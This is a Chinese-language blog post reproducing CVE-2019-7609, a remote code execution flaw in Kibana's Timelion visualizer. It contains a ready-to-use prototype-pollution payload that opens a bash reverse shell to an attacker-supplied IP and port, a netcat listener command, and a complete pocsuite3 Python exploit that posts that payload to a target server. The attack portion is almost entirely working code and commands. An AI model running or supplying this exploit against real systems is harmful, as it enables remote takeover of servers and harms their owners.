---
title:  kibana远程代码执行漏洞复现
date: 2019-10-20 15:13:23
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - kibana
    - Elasticsearch
    - RCE
    - 漏洞复现
---

# 0x01 漏洞概述

Elasticsearch Kibana是荷兰Elasticsearch公司的一套开源的、基于浏览器的分析和搜索Elasticsearch仪表板工具。
Kibana 5.6.15之前版本和6.6.1之前版本中的Timelion visualizer存在安全漏洞。
远程攻击者可通过发送请求利用该漏洞执行JavaScript代码并能以Kibana进程权限执行任意命令。

# 0x02 影响版本

```
ElasticSearch Kibana <5.6.15
ElasticSearch Kibana <6.6.1
```

# 0x03 漏洞复现
## 复现环境

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022192025.png)

该漏洞触发，需要` Timelion` 和 `Canvas`插件

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022191915.png)

## 漏洞利用

在服务器监听
payload里面设置的什么端口，就监听什么端口。

`nc -lvvp 12345`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022204934.png)


点在Timelion处,直接填入payload，点击run
**（如果有设置用户认证，则需要先登陆）**
过程和结果如图


**payload：**

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/IP/PORT 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```


![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022210726.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022192538.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191022205351.png)


**POC**

```
#! python3
"""

@FileName: elasticsearch_kibana_rce.py
@Author: dylan
@software: PyCharm 
@Datetime: 2019-10-20 15:23:54

"""
import re
from collections import OrderedDict
import json
import urllib.parse
from bs4 import BeautifulSoup
from pocsuite3.api import Output, POCBase, register_poc, requests, OptString


class DemoPOC(POCBase):
    vulID = "CVE-2019-7609"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "3.0"  # 默认为1
    author = "dylan"  # PoC作者的大名
    vulDate = "2019/10/20"  # 漏洞公开的时间,不知道就写今天
    createDate = "2019/10/20"  # 编写 PoC 的日期
    updateDate = "2019/10/20"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/jas502n/kibana-RCE"]  # 漏洞地址来源,0day不用写
    name = "elasticsearch_kibana_rce"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "elasticsearch_kibana"  # 漏洞应用名称
    appVersion = "Kibana < 6.6.1,Kibana < 5.6.15"  # 漏洞影响版本
    vulType = "rce"  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = """
        Need Timelion And Canvas
    """  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = """
    pocsuite -r "elasticsearch_kibana_rce.py" -u 目标ip --ncip "监听ip" --ncport "监听端口"

    pocsuite -r "elasticsearch_kibana_rce.py" -u https://192.168.1.1 --ncip "192.168.1.1" --ncport "12345"
    """

    def _options(self):
        o = OrderedDict()
        o["ncip"] = OptString('', description='请输入监听服务器IP', require=True)
        o["ncport"] = OptString('', description='请输入监听服务器端口', require=True)
        return o

    def _verify(self):
        # 验证代码
        result = {}
        output = Output(self)
        path1 = self.url + "/app/timelion"
        path2 = self.url + "/api/timelion/run"
        payload = {
            "sheet": [
                ".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& "
                "/dev/tcp/" + self.get_option("ncip") + "/" + self.get_option(
                    "ncport") + " 0>&1\");process.exit()//')\n.props("
                                "label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],
            "time": {"from": "now-15m", "to": "now", "mode": "quick", "interval": "auto",
                     "timezone": "Asia/Shanghai"}
        }

        html = requests.get(path1, verify=False, timeout=120).text
        # print(html)
        soup = BeautifulSoup(html, 'lxml')
        kbn_version = re.compile('\d\.\d\.\d').search(str(soup.find("kbn-injected-metadata"))).group(0)
        # print(kbn_version)

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
            'Accept': 'application/json, text/plain, */*',
            "Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            'Connection': 'close',
            'kbn-version': kbn_version,
            'Content-Type': 'application/json;charset=UTF-8'
        }

        respose2 = requests.post(path2, headers=header, data=json.dumps(payload), verify=False, timeout=30)
        # print(respose2.status_code)
        if respose2.status_code == 200:  # result是返回结果
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Referer'] = ""
        return self.parse_output(result)

    def _attack(self):
        # 攻击代码
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("target is not vulnerable")
        return output


# 注册 DemoPOC 类
register_poc(DemoPOC)

```

# 参考文章
[kibana-RCE: kibana < 6.6.0 未授权远程代码命令执行 (Need Timelion And Canvas),CVE-2019-7609](https://github.com/jas502n/kibana-RCE)